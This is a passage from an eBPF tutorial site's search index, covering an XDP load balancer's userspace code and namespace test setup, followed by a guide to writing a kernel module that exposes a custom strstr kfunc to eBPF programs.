&lt; 0) {\n        fprintf(stderr, \"Failed to attach XDP program\\n\");\n        xdp_lb_bpf__destroy(skel);\n        return 1;\n    }\n\n    // Update backend configurations\n    for (int i = 0; i &lt; 2; i++) {\n        if (bpf_map_update_elem(bpf_map__fd(skel-&gt;maps.backends), &amp;i, &amp;backend[i], 0) &lt; 0) {\n            perror(\"bpf_map_update_elem\");\n            xdp_lb_bpf__destroy(skel);\n            return 1;\n        }\n    }\n\n    printf(\"XDP load balancer configured with backends:\\n\");\n    printf(\"Backend 1 - IP: %s, MAC: %s\\n\", argv[2], argv[3]);\n    printf(\"Backend 2 - IP: %s, MAC: %s\\n\", argv[4], argv[5]);\n\n    printf(\"Press Ctrl+C to exit...\\n\");\n    while (1) {\n        sleep(1);  // Keep the program running\n    }\n\n    // Cleanup and detach\n    bpf_xdp_detach(ifindex, 0, NULL);\n    xdp_lb_bpf__detach(skel);\n    xdp_lb_bpf__destroy(skel);\n    return 0;\n}\n</code></pre> <p>The userspace code provided is responsible for setting up and configuring the XDP load balancer program that runs in the kernel. It accepts command-line arguments, loads the eBPF program, attaches it to a network interface, and updates the backend configurations.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#1-argument-parsing-and-backend-setup","title":"1. Argument Parsing and Backend Setup","text":"<p>The program expects five command-line arguments: the name of the network interface (<code>ifname</code>), the IP addresses and MAC addresses of two backend servers. It then parses the IP addresses using <code>inet_pton()</code> and the MAC addresses using the <code>parse_mac()</code> function, which ensures that the format of the provided MAC addresses is correct. The parsed backend information is stored in a <code>backend_config</code> structure.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#2-loading-and-attaching-the-bpf-program","title":"2. Loading and Attaching the BPF Program","text":"<p>The BPF skeleton (generated via <code>xdp_lb.skel.h</code>) is used to open and load the XDP program into the kernel. The program then identifies the network interface by converting the interface name into an index using <code>if_nametoindex()</code>. Afterward, it attaches the loaded BPF program to this interface using <code>bpf_program__attach_xdp()</code>.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#3-configuring-backend-information","title":"3. Configuring Backend Information","text":"<p>The backend IP and MAC addresses are written to the <code>backends</code> BPF map using <code>bpf_map_update_elem()</code>. This step ensures that the BPF program has access to the backend configurations, allowing it to route packets to the correct backend servers based on the logic in the kernel code.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#4-program-loop-and-cleanup","title":"4. Program Loop and Cleanup","text":"<p>The program enters an infinite loop (<code>while (1) { sleep(1); }</code>) to keep running, allowing the XDP program to continue functioning. When the user decides to exit by pressing Ctrl+C, the BPF program is detached from the network interface, and resources are cleaned up by calling <code>xdp_lb_bpf__destroy()</code>.</p> <p>In summary, this userspace code is responsible for configuring and managing the lifecycle of the XDP load balancer, making it easy to update backend configurations dynamically and ensuring the load balancer is correctly attached to a network interface.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#the-topology-of-test-environment","title":"The topology of test environment","text":"<p>The topology represents a test environment where a local machine communicates with two backend nodes (h2 and h3) through a load balancer. The local machine is connected to the load balancer via virtual Ethernet pairs (veth0 to veth6), simulating network connections in a controlled environment. Each virtual interface has its own IP and MAC address to represent different entities.</p> <pre><code>    +---------------------------+          \n    |      Local Machine         |\n    |  IP: 10.0.0.1 (veth0)      |\n    |  MAC: DE:AD:BE:EF:00:01    |\n    +------------+---------------+\n             |\n             | (veth1)\n             |\n    +--------+---------------+       \n    |    Load Balancer       |\n    |  IP: 10.0.0.10 (veth6) |\n    |  MAC: DE:AD:BE:EF:00:10|\n    +--------+---------------+       \n             | \n   +---------+----------------------------+            \n   |                                      |\n(veth2)                                (veth4)    \n   |                                      | \n+--+---------------+             +--------+---------+\n| h2               |             | h3               |\n| IP:              |             | IP:              |\n|10.0.0.2 (veth3)  |             |10.0.0.3 (veth5)  |\n| MAC:             |             | MAC:             |\n|DE:AD:BE:EF:00:02 |             |DE:AD:BE:EF:00:03 |\n+------------------+             +------------------+\n</code></pre> <p>The setup can be easily initialized with a script (setup.sh), and removed with a teardown script (teardown.sh).</p> <p>If you are interested in this tutorial, please help us create a containerized version of the setup and topology! Currently the setup and teardown are based on the network namespace, it will be more friendly to have a containerized version of the setup and topology.</p> <p>Setup:</p> <pre><code>sudo ./setup.sh\n</code></pre> <p>Teardown:</p> <pre><code>sudo ./teardown.sh\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#running-the-load-balancer","title":"Running the Load Balancer","text":"<p>To run the XDP load balancer, execute the following command, specifying the interface and backends' IP and MAC addresses:</p> <pre><code>sudo ip netns exec lb ./xdp_lb veth6 10.0.0.2 de:ad:be:ef:00:02 10.0.0.3 de:ad:be:ef:00:03\n</code></pre> <p>This will configure the load balancer and print the details of the backends:</p> <pre><code>XDP load balancer configured with backends:\nBackend 1 - IP: 10.0.0.2, MAC: de:ad:be:ef:00:02\nBackend 2 - IP: 10.0.0.3, MAC: de:ad:be:ef:00:03\nPress Ctrl+C to exit...\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#testing-the-setup","title":"Testing the Setup","text":"<p>You can test the setup by starting HTTP servers on the two backend namespaces (<code>h2</code> and <code>h3</code>) and sending requests from the local machine to the load balancer:</p> <p>Start servers on <code>h2</code> and <code>h3</code>:</p> <pre><code>sudo ip netns exec h2 python3 -m http.server\nsudo ip netns exec h3 python3 -m http.server\n</code></pre> <p>Then, send a request to the load balancer IP:</p> <pre><code>curl 10.0.0.10:8000\n</code></pre> <p>The load balancer will distribute traffic to the backends (<code>h2</code> and <code>h3</code>) based on the hashing function.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#monitoring-with-bpf_printk","title":"Monitoring with <code>bpf_printk</code>","text":"<p>You can monitor the load balancer's activity by checking the <code>bpf_printk</code> logs. The BPF program prints diagnostic messages whenever a packet is processed. You can view these logs using:</p> <pre><code>sudo cat /sys/kernel/debug/tracing/trace_pipe\n</code></pre> <p>Example output:</p> <pre><code>&lt;idle&gt;-0       [004] ..s2. 24174.812722: bpf_trace_printk: xdp_load_balancer received packet\n&lt;idle&gt;-0       [004] .Ns2. 24174.812729: bpf_trace_printk: Received Source IP: 0xa000001\n&lt;idle&gt;-0       [004] .Ns2. 24174.812729: bpf_trace_printk: Received Destination IP: 0xa00000a\n&lt;idle&gt;-0       [004] .Ns2. 24174.812731: bpf_trace_printk: Received Source MAC: de:ad:be:ef:0:1\n&lt;idle&gt;-0       [004] .Ns2. 24174.812732: bpf_trace_printk: Received Destination MAC: de:ad:be:ef:0:10\n&lt;idle&gt;-0       [004] .Ns2. 24174.812732: bpf_trace_printk: Packet from client\n&lt;idle&gt;-0       [004] .Ns2. 24174.812734: bpf_trace_printk: Redirecting packet to new IP 0xa000002 from IP 0xa00000a\n&lt;idle&gt;-0       [004] .Ns2. 24174.812735: bpf_trace_printk: New Dest MAC: de:ad:be:ef:0:2\n&lt;idle&gt;-0       [004] .Ns2. 24174.812735: bpf_trace_printk: New Source MAC: de:ad:be:ef:0:10\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#debugging-issues","title":"Debugging Issues","text":"<p>Some systems may experience packet loss or failure to forward packets due to issues similar to those described in this blog post. You can debug these issues using <code>bpftrace</code> to trace XDP errors:</p> <pre><code>sudo bpftrace -e 'tracepoint:xdp:xdp_bulk_tx{@redir_errno[-args-&gt;err] = count();}'\n</code></pre> <p>If you see an output like this:</p> <pre><code>@redir_errno[6]: 3\n</code></pre> <p>It indicates errors related to XDP packet forwarding. The error code <code>6</code> typically points to a particular forwarding issue that can be further investigated.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#conclusion","title":"Conclusion","text":"<p>This tutorial demonstrates how to set up a simple XDP load balancer using eBPF, providing efficient traffic distribution across backend servers. For those interested in learning more about eBPF, including more advanced examples and tutorials, please visit our https://github.com/eunomia-bpf/bpf-developer-tutorial or our website https://eunomia.dev/tutorials/.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#references","title":"References","text":"<p>Here\u2019s a simple list of XDP references:</p> <ol> <li>XDP Programming Hands-On Tutorial</li> <li>XDP Tutorial in bpf-developer-tutorial</li> </ol> <p>Share on  Share on </p>"},{"location":"tutorials/42-xdp-loadbalancer/connect/","title":"Network setup for bpf-developer-tutorial","text":"<p>In this tutorial, we will set up a simple network topology that simulates a load balancer using eBPF/XDP (Express Data Path). The setup includes a local machine, a load balancer (which can be enhanced with an XDP program), and two backend servers (<code>h2</code> and <code>h3</code>). The local machine routes packets to the load balancer, which then distributes traffic between the backend servers.</p>"},{"location":"tutorials/42-xdp-loadbalancer/connect/#simple-xdp-load-balancer-tutorial","title":"Simple XDP Load Balancer Tutorial","text":"<p>This tutorial will guide you in setting up a simple virtual network to simulate a load balancer using eBPF/XDP.</p>"},{"location":"tutorials/42-xdp-loadbalancer/connect/#network-topology","title":"Network Topology","text":"<pre><code>   +------------------+\n   |  Local Machine   |\n   |  IP: 10.0.0.1    |\n   +--------+---------+\n            |\n   +--------+---------+\n   |   Load Balancer  |\n   |  IP: 10.0.0.10   |\n   +--------+---------+\n            |\n    +-------+-------+\n    |               |\n+---+---+       +---+---+\n|  h2   |       |  h3   |\n|10.0.0.2|       |10.0.0.3|\n+-------+       +-------+\n</code></pre> <ul> <li>Local Machine: Simulates a client (<code>10.0.0.1</code>) sending traffic.</li> <li>Load Balancer: Distributes traffic to backend servers (<code>10.0.0.10</code>).</li> <li>h2 and h3: Simulate backend servers (<code>10.0.0.2</code> and <code>10.0.0.3</code>).</li> </ul>"},{"location":"tutorials/42-xdp-loadbalancer/connect/#setup-steps","title":"Setup Steps","text":"<p>This script creates virtual network namespaces and sets up IP addresses for the local machine, load balancer, and backend servers.</p> <pre><code>sudo ./setup.sh\n</code></pre> <p>To clean up the setup after testing:</p> <pre><code>sudo ./teardown.sh\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/connect/#testing-the-network","title":"Testing the Network","text":"<p>You can test the network connectivity using <code>ping</code> commands:</p> <p>Ping Between Backend Servers (<code>h2</code> to <code>h3</code>)</p> <pre><code>sudo ip netns exec h2 ping -c 3 10.0.0.3\n</code></pre> <p>Ping from Backend Server (<code>h2</code>) to Load Balancer</p> <pre><code>sudo ip netns exec h2 ping -c 3 10.0.0.10\n</code></pre> <p>Ping from Local Machine to Load Balancer</p> <pre><code>ping -c 3 10.0.0.10\n</code></pre> <p>That's it! This simple setup lets you simulate a load balancer using eBPF/XDP. You can extend it by adding custom XDP programs to control the traffic distribution between <code>h2</code> and <code>h3</code>.</p> <p>Share on  Share on </p>"},{"location":"tutorials/43-kfuncs/","title":"Extending eBPF Beyond Its Limits: Custom kfuncs in Kernel Modules","text":"<p>Have you ever felt constrained by eBPF's capabilities? Maybe you've run into situations where the existing eBPF features just aren't enough to accomplish your goals. Perhaps you need deeper interactions with the kernel, or you're facing performance issues that the standard eBPF runtime can't solve. If you've ever wished for more flexibility and power in your eBPF programs, this tutorial is for you.</p>"},{"location":"tutorials/43-kfuncs/#introduction-adding-a-strstr-kfunc-to-break-free-from-ebpf-runtime-limitations","title":"Introduction: Adding a <code>strstr</code> kfunc to Break Free from eBPF Runtime Limitations","text":"<p>eBPF (extended Berkeley Packet Filter) has revolutionized Linux system programming by allowing developers to run sandboxed programs inside the kernel. It's a game-changer for networking, security, and observability, enabling powerful functionalities without the need to modify kernel source code or load traditional kernel modules.</p> <p>But as amazing as eBPF is, it isn't without its limitations:</p> <ul> <li>Functionality Gaps: Sometimes, the existing features of the eBPF runtime don't provide the specific capabilities you need.</li> <li>Complex Requirements: Certain tasks demand more intricate kernel interactions that eBPF can't handle out of the box.</li> <li>Performance Issues: In some cases, the overhead of the eBPF runtime introduces latency or isn't efficient enough for high-performance requirements.</li> </ul> <p>These challenges stem from the limitations of the entire eBPF runtime, not just its helper functions. So how do you overcome these hurdles without altering the kernel itself?</p> <p>Enter kfuncs (BPF Kernel Functions). By defining your own kfuncs within kernel modules, you can extend eBPF's capabilities beyond its default limitations. This approach lets you:</p> <ul> <li>Enhance Functionality: Introduce new operations that aren't available in the standard eBPF runtime.</li> <li>Customize Behavior: Tailor kernel interactions to fit your specific needs.</li> <li>Boost Performance: Optimize critical paths by executing custom code directly in the kernel context.</li> </ul> <p>In this tutorial, we'll specifically add a <code>strstr</code> kfunc. While implementing a string search directly in eBPF is challenging due to verifier restrictions, defining it as a kfunc allows us to bypass these limitations and perform more complex operations safely and efficiently.</p> <p>Best of all, you achieve this without modifying the core kernel, keeping your system stable and your code safe.</p> <p>In this tutorial, we'll show you how to define custom kfuncs to fill any gaps in eBPF's capabilities. We'll walk through creating a kernel module that introduces new kfuncs and demonstrate how to use them in your eBPF programs. Whether you're looking to overcome performance bottlenecks or need features the eBPF runtime doesn't offer, custom kfuncs can unlock new possibilities for your projects.</p>"},{"location":"tutorials/43-kfuncs/#understanding-kfunc-extending-ebpf-beyond-helpers","title":"Understanding kfunc: Extending eBPF Beyond Helpers","text":""},{"location":"tutorials/43-kfuncs/#what-are-kfuncs","title":"What Are kfuncs?","text":"<p>BPF Kernel Functions (kfuncs) are specialized functions within the Linux kernel that are exposed for use by eBPF programs. Unlike standard eBPF helpers, kfuncs do not have a stable interface and can vary between kernel releases. This variability means that BPF programs utilizing kfuncs need to be updated in tandem with kernel updates to maintain compatibility and stability.</p>"},{"location":"tutorials/43-kfuncs/#why-use-kfuncs","title":"Why Use kfuncs?","text":"<ol> <li>Extended Functionality: kfuncs enable operations that standard eBPF helpers cannot perform.</li> <li>Customization: Define logic tailored to specific use cases, enhancing the flexibility of eBPF programs.</li> <li>Safety and Stability: By encapsulating kfuncs within kernel modules, you avoid direct modifications to the core kernel, preserving system integrity.</li> </ol>"},{"location":"tutorials/43-kfuncs/#how-kfuncs-fit-into-ebpf","title":"How kfuncs Fit into eBPF","text":"<p>kfuncs serve as bridges between eBPF programs and deeper kernel functionalities. They allow eBPF programs to perform more intricate operations by either exposing existing kernel functions or introducing new wrappers specifically designed for eBPF interactions. This integration facilitates deeper kernel interactions while ensuring that eBPF programs remain safe and maintainable.</p> <p>It's important to note that the Linux kernel already includes a plethora of kfuncs. These built-in kfuncs cover a wide range of functionalities, allowing most developers to accomplish their tasks without the need to define new ones. However, in cases where the existing kfuncs do not meet specific requirements, defining custom kfuncs becomes necessary. This tutorial demonstrates how to define new kfuncs to fill any gaps, ensuring that your eBPF programs can leverage the exact functionality you need. eBPF can also be extended to userspace. In the userspace eBPF runtime bpftime, we are also implementing ufuncs, which are similar to kfuncs but extend userspace applications.</p>"},{"location":"tutorials/43-kfuncs/#overview-of-kfuncs-and-their-evolution","title":"Overview of kfuncs and Their Evolution","text":"<p>To appreciate the significance of kfuncs, it's essential to understand their evolution in relation to eBPF helper functions.</p> <p></p> <p>Key Takeaways:</p> <ul> <li>Stability of Helper Functions: eBPF helper functions have remained largely stable, with minimal new additions.</li> <li>Rapid Growth of kfuncs: There's been a significant increase in the adoption and creation of kfuncs, indicating the community's interest in expanding kernel interactions via kfuncs.</li> <li>Shift Towards Deeper Kernel Integrations: Since 2023, new use cases predominantly leverage kfuncs to influence kernel behavior, signaling a trend towards more profound kernel integrations through eBPF.</li> </ul> <p>This trend underscores the community's drive to push the boundaries of what eBPF can achieve by integrating more deeply with the kernel through kfuncs.</p>"},{"location":"tutorials/43-kfuncs/#defining-your-own-kfunc-a-step-by-step-guide","title":"Defining Your Own kfunc: A Step-by-Step Guide","text":"<p>To harness the power of kfuncs, you'll need to define them within a kernel module. This process ensures that your custom functions are safely exposed to eBPF programs without altering the core kernel.</p>"},{"location":"tutorials/43-kfuncs/#writing-the-kernel-module","title":"Writing the Kernel Module","text":"<p>Let's start by creating a simple kernel module that defines a <code>strstr</code> kfunc. This kfunc will perform a substring search operation, serving as a foundation for understanding the mechanics.</p>"},{"location":"tutorials/43-kfuncs/#file-helloc","title":"File: <code>hello.c</code>","text":"<pre><code>#include &lt;linux/init.h&gt;       // Macros for module initialization\n#include &lt;linux/module.h&gt;     // Core header for loading modules\n#include &lt;linux/kernel.h&gt;     // Kernel logging macros\n#include &lt;linux/bpf.h&gt;\n#include &lt;linux/btf.h&gt;\n#include &lt;linux/btf_ids.h&gt;\n\n/* Declare the kfunc prototype */\n__bpf_kfunc int bpf_strstr(const char *str, u32 str__sz, const char *substr, u32 substr__sz);\n\n/* Begin kfunc definitions */\n__bpf_kfunc_start_defs();\n\n/* Define the bpf_strstr kfunc */\n__bpf_kfunc int bpf_strstr(const char *str, u32 str__sz, const char *substr, u32 substr__sz)\n{\n    // Edge case: if substr is empty, return 0 (assuming empty string is found at the start)\n    if (substr__sz == 0)\n    {\n        return 0;\n    }\n    // Edge case: if the substring is longer than the main string, it's impossible to find\n    if (substr__sz &gt; str__sz)\n    {\n        return -1; // Return -1 to indicate not found\n    }\n    // Iterate through the main string, considering the size limit\n    for (size_t i = 0; i &lt;= str__sz - substr__sz; i++)\n    {\n        size_t j = 0;\n        // Compare the substring with the current position in the string\n        while (j &lt; substr__sz &amp;&amp; str[i + j] == substr[j])\n        {\n            j++;\n        }\n        // If the entire substring was found\n        if (j == substr__sz)\n        {\n            return i; // Return the index of the first match\n        }\n    }\n    // Return -1 if the substring is not found\n    return -1;\n}\n\n/* End kfunc definitions */\n__bpf_kfunc_end_defs();\n\n/* Define the BTF kfuncs ID set */\nBTF_KFUNCS_START(bpf_kfunc_example_ids_set)\nBTF_ID_FLAGS(func, bpf_strstr)\nBTF_KFUNCS_END(bpf_kfunc_example_ids_set)\n\n/* Register the kfunc ID set */\nstatic const struct btf_kfunc_id_set bpf_kfunc_example_set = {\n    .owner = THIS_MODULE,\n    .set = &amp;bpf_kfunc_example_ids_set,\n};\n\n/* Function executed when the module is loaded */\nstatic int __init hello_init(void)\n{\n    int ret;\n\n    printk(KERN_INFO \"Hello, world!\\n\");\n    /* Register the BTF kfunc ID set for BPF_PROG_TYPE_KPROBE */\n    ret = register_btf_kfunc_id_set(BPF_PROG_TYPE_KPROBE, &amp;bpf_kfunc_example_set);\n    if (ret)\n    {\n        pr_err(\"bpf_kfunc_example: Failed to register BTF kfunc ID set\\n\");\n        return ret;\n    }\n    printk(KERN_INFO \"bpf_kfunc_example: Module loaded successfully\\n\");\n    return 0; // Return 0 if successful\n}\n\n/* Function executed when the module is removed */\nstatic void __exit hello_exit(void)\n{\n    /* Unregister the BTF kfunc ID set */\n    unregister_btf_kfunc_id_set(BPF_PROG_TYPE_KPROBE, &amp;bpf_kfunc_example_set);\n    printk(KERN_INFO \"Goodbye, world!\\n\");\n}\n\n/* Macros to define the module\u2019s init and exit points */\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n\nMODULE_LICENSE(\"GPL\");                 // License type (GPL)\nMODULE_AUTHOR(\"Your Name\");            // Module author\nMODULE_DESCRIPTION(\"A simple module\"); // Module description\nMODULE_VERSION(\"1.0\");                 // Module version\n</code></pre> <p>Explanation of the Code:</p> <ul> <li> <p>Declaring the kfunc: The <code>__bpf_kfunc</code> macro declares a function that eBPF programs can invoke. Here, <code>bpf_strstr</code> performs a substring search within a given string.</p> </li> <li> <p>BTF Definitions: The <code>__bpf_kfunc_start_defs</code> and <code>__bpf_kfunc_end_defs</code> macros demarcate the beginning and end of kfunc definitions. The <code>BTF_KFUNCS_START</code> and related macros assist in registering the kfuncs with the BPF Type Format (BTF).</p> </li> <li> <p>Module Initialization: The <code>hello_init</code> function registers the kfunc ID set, making <code>bpf_strstr</code> available to eBPF programs of type <code>BPF_PROG_TYPE_KPROBE</code>.</p> </li> <li> <p>Module Cleanup: The <code>hello_exit</code> function ensures that the kfunc ID set is unregistered upon module removal, maintaining system cleanliness.</p> </li> </ul>"},{"location":"tutorials/43-kfuncs/#file-makefile","title":"File: <code>Makefile</code>","text":"<pre><code>obj-m += hello.o  # hello.o is the target\n\n# Enable BTF generation\nKBUILD_CFLAGS += -g -O2\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n</code></pre> <p>Explanation of the Makefile:</p> <ul> <li> <p>Target Definition: <code>obj-m += hello.o</code> specifies that <code>hello.o</code> is the module to be built.</p> </li> <li> <p>BTF Generation Flags: <code>KBUILD_CFLAGS += -g -O2</code> enables debug information and optimization, facilitating BTF generation.</p> </li> <li> <p>Build Commands:</p> </li> <li><code>all</code>: Compiles the kernel module by invoking the kernel build system.</li> <li><code>clean</code>: Cleans up the build artifacts.</li> </ul> <p>Note: The provided code has been tested on Linux kernel version 6.11. If you're using an earlier version, you might need to implement workarounds, such as referencing <code>compact.h</code>.</p>"},{"location":"tutorials/43-kfuncs/#compiling-the-kernel-module","title":"Compiling the Kernel Module","text":"<p>With the kernel module source and Makefile in place, follow these steps to compile the module:</p> <ol> <li>Navigate to the Module Directory:</li> </ol> <pre><code>cd /path/to/bpf-developer-tutorial/src/43-kfuncs/module/\n</code></pre> <ol> <li>Compile the Module:</li> </ol> <pre><code>make\n</code></pre> <p>This command will generate a file named <code>hello.ko</code>, which is the compiled kernel module.</p>"},{"location":"tutorials/43-kfuncs/#loading-the-kernel-module","title":"Loading the Kernel Module","text":"<p>To insert the compiled module into the kernel, use the <code>insmod</code> command:</p> <pre><code>sudo insmod hello.ko\n</code></pre>"},{"location":"tutorials/43-kfuncs/#verifying-module-loading","title":"Verifying Module Loading","text":"<p>After loading the module, verify its successful insertion by checking the kernel logs:</p> <pre><code>dmesg | tail\n</code></pre> <p>Expected Output:</p> <pre><code>[ 1234.5678] Hello, world!\n[ 1234.5679] bpf_kfunc_example: Module loaded successfully\n</code></pre>"},{"location":"tutorials/43-kfuncs/#removing-the-kernel-module","title":"Removing the Kernel Module","text":"<p>When you no longer need the module, unload it using the <code>rmmod</code> command:</p> <pre><code>sudo rmmod hello\n</code></pre> <p>Verify Removal:</p> <pre><code>dmesg | tail\n</code></pre> <p>Expected Output:</p> <pre><code>[ 1234.9876] Goodbye, world!\n</code></pre>"},{"location":"tutorials/43-kfuncs/#handling-compilation-errors","title":"Handling Compilation Errors","text":"<p>During the compilation process, you might encounter the following error:</p> <pre><code>Skipping BTF generation for /root/bpf-developer-tutorial/src/43-kfuncs/module/hello.ko due to unavailability of vmlinux\n</code></pre> <p>Solution:</p> <ol> <li>Install the <code>dwarves</code> Package:</li> </ol> <p>The <code>dwarves</code> package provides tools necessary for BTF generation.</p> <pre><code>sudo apt install dwarves\n</code></pre> <ol> <li>Copy the <code>vmlinux</code> File:</li> </ol> <p>Ensure that the <code>vmlinux</code> file, which contains BTF information, is available in the build directory.</p> <pre><code>sudo cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/\n</code></pre> <p>This command copies the <code>vmlinux</code> file to the appropriate build directory, enabling successful BTF generation.</p> <p>The complete code for this tutorial can be found in the bpf-developer-tutorial repository on GitHub. This is tested on Linux kernel version 6.11, and some modifications may be required for lower versions, referring to <code>compact.h</code>.</p>"},{"location":"tutorials/43-kfuncs/#utilizing-your-custom-kfunc-in-an-ebpf-program","title":"Utilizing Your Custom kfunc in an eBPF Program","text":"<p>With the kernel module defining your custom <code>strstr</code> kfunc in place, the next step is to create an eBPF program that leverages this function. This interaction showcases the enhanced capabilities introduced by kfuncs.</p>"},{"location":"tutorials/43-kfuncs/#writing-the-ebpf-program","title":"Writing the eBPF Program","text":"<p>Create an eBPF program that attaches to the <code>do_unlinkat</code> kernel function and uses the custom <code>bpf_strstr</code> kfunc.</p>"},{"location":"tutorials/43-kfuncs/#file-kfuncc","title":"File: <code>kfunc.c</code>","text":"<pre><code>/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */\n#define BPF_NO_GLOBAL_DATA\n#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\ntypedef unsigned int u32;\ntypedef long long s64;\n\n/* Declare the external kfunc */\nextern int bpf_strstr(const char *str, u32 str__sz, const char *substr, u32 substr__sz) __ksym;\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nSEC(\"kprobe/do_unlinkat\")\nint handle_kprobe(struct pt_regs *ctx)\n{\n    pid_t pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    char str[] = \"Hello, world!\";\n    char substr[] = \"wor\";\n    int result = bpf_strstr(str, sizeof(str) - 1, substr, sizeof(substr) - 1);\n    if (result != -1)\n    {\n        bpf_printk(\"'%s' found in '%s' at index %d\\n\", substr, str, result);\n    }\n    bpf_printk(\"Hello, world! (pid: %d) bpf_strstr %d\\n\", pid, result);\n    return 0;\n}\n</code></pre> <p>Explanation of the eBPF Code:</p> <ul> <li> <p>External kfunc Declaration: The <code>extern</code> keyword declares the <code>bpf_strstr</code> function, making it accessible within the eBPF program.</p> </li> <li> <p>Kprobe Attachment: The <code>SEC(\"kprobe/do_unlinkat\")</code> macro attaches the eBPF program to the <code>do_unlinkat</code> kernel function. Every time <code>do_unlinkat</code> is invoked, the <code>handle_kprobe</code> function executes.</p> </li> <li> <p>Using the kfunc: Within <code>handle_kprobe</code>, the eBPF program calls <code>bpf_strstr</code> with four arguments:</p> </li> <li><code>str</code>: The main string to search within.</li> <li><code>str__sz</code>: The size of the main string.</li> <li><code>substr</code>: The substring to search for.</li> <li><code>substr__sz</code>: The size of the substring.</li> </ul> <p>The result, which is the index of the first occurrence of <code>substr</code> in <code>str</code> or <code>-1</code> if not found, is then printed using <code>bpf_printk</code>, displaying both the PID and the result.</p> <p>Important Note: Implementing a <code>strstr</code>-like function directly in eBPF is challenging due to verifier restrictions that limit loops and complex memory accesses. By implementing <code>strstr</code> as a kfunc, we bypass these limitations, allowing for more complex and efficient string operations within eBPF programs.</p>"},{"location":"tutorials/43-kfuncs/#compiling-the-ebpf-program","title":"Compiling the eBPF Program","text":"<p>To compile the eBPF program, ensure you have the necessary tools installed, such as <code>clang</code> and <code>llvm</code>. Here's how you can compile the program:</p> <ol> <li>Navigate to the eBPF Program Directory:</li> </ol> <pre><code>cd /path/to/bpf-developer-tutorial/src/43-kfuncs/\n</code></pre> <ol> <li>Create a <code>Makefile</code> for the eBPF Program:</li> </ol> <pre><code># File: Makefile\n\nCLANG ?= clang\nLLVM_STRIP ?= llvm-strip\nBPF_TARGET := bpf\n\nCFLAGS := -O2 -g -target $(BPF_TARGET) -Wall -Werror -I/usr/include\n\nall: kfunc.o\n\nkfunc.o: kfunc.c\n    $(CLANG) $(CFLAGS) -c $&lt; -o $@\n\nclean:\n    rm -f kfunc.o\n</code></pre> <ol> <li>Compile the eBPF Program:</li> </ol> <pre><code>make\n</code></pre> <p>This command will generate a file named <code>kfunc.o</code>, which is the compiled eBPF object file.</p>"},{"location":"tutorials/43-kfuncs/#running-the-ebpf-program","title":"Running the eBPF Program","text":"<p>Assuming you have a user-space application or a tool to load and attach the eBPF program, you can execute it to observe the interaction between the eBPF program and the custom kfunc.</p> <p>Sample Output:</p> <pre><code># sudo ./kfunc\nBPF program loaded and attached successfully. Press Ctrl-C to exit.\n</code></pre> <p>Then, when the <code>do_unlinkat</code> function is invoked (e.g., when a file is unlinked), you can check the kernel logs:</p> <pre><code>dmesg | tail\n</code></pre> <p>Expected Output:</p> <pre><code>[ 1234.5678] 'wor' found in 'Hello, world!' at index 7\n[ 1234.5679] Hello, world! (pid: 2075) bpf_strstr 7\n</code></pre> <p>Explanation of the Output:</p> <p>Each time the <code>do_unlinkat</code> function is invoked in the kernel, the eBPF program prints a message indicating the PID of the process and the result of the kfunc call. In this example, the substring <code>\"wor\"</code> is found at index <code>7</code> in the string <code>\"Hello, world!\"</code>.</p>"},{"location":"tutorials/43-kfuncs/#summary-and-conclusion","title":"Summary and Conclusion","text":"<p>In this tutorial, we've delved deep into extending eBPF's capabilities by defining and utilizing custom kernel functions (kfuncs). Here's a recap of what we've covered:</p> <ul> <li>Understanding kfuncs: Grasped the concept of kfuncs and their role in enhancing eBPF beyond standard helper functions.</li> <li>Defining kfuncs: Created a kernel module that defines a custom <code>strstr</code> kfunc, ensuring it can be safely exposed to eBPF programs without altering the core kernel.</li> <li>Writing eBPF Programs with kfuncs: Developed an eBPF program that leverages the custom kfunc to perform specific operations, demonstrating the enhanced functionality.</li> <li>Compilation and Execution: Provided a step-by-step guide to compile, load, and run both the kernel module and the eBPF program, ensuring you can replicate the setup on your own system.</li> <li>Error Handling: Addressed potential compilation issues and offered solutions to ensure a smooth development experience.</li> </ul> <p>Key Takeaways:</p> <ul> <li>Overcoming Helper Limitations: kfuncs bridge the gaps left by standard eBPF helpers, offering extended functionality tailored to specific needs.</li> <li>Maintaining System Stability: By encapsulating kfuncs within kernel modules, you ensure that system stability is maintained without making invasive changes to the kernel.</li> <li>Community-Driven Evolution: The rapid growth and adoption of kfuncs highlight the eBPF community's commitment to pushing the boundaries of what's possible with kernel-level programming.</li> <li>Leveraging Existing kfuncs: Before defining new kfuncs, explore the existing ones provided by the kernel. They cover a wide range of functionalities, reducing the need to create custom functions unless absolutely necessary.</li> </ul> <p>Ready to elevate your eBPF skills even further? Visit our tutorial repository and explore more tutorials on our website. Dive into a wealth of examples, deepen your understanding, and contribute to the dynamic world of eBPF!</p> <p>Happy eBPF-ing!</p>"},{"location":"tutorials/43-kfuncs/#references","title":"References","text":"<ul> <li>BPF Kernel Functions Documentation</li> <li>eBPF kfuncs Guide</li> </ul>"},{"location":"tutorials/43-kfuncs/#additional-resources","title":"Additional Resources","text":"<p>If you'd like to learn more about eBPF knowledge and practices, you can visit our open-source tutorial code repository at bpf-developer-tutorial or our website eunomia.dev/tutorials for more examples and complete code.</p> <p>Share on  Share on </p>"},{"location":"tutorials/43-kfuncs/module/","title":"write a basic kernel module","text":""},{"location":"tutorials/43-kfuncs/module/#hello-world","title":"hello world","text":"<p>Writing a Linux kernel module involves creating code that can be 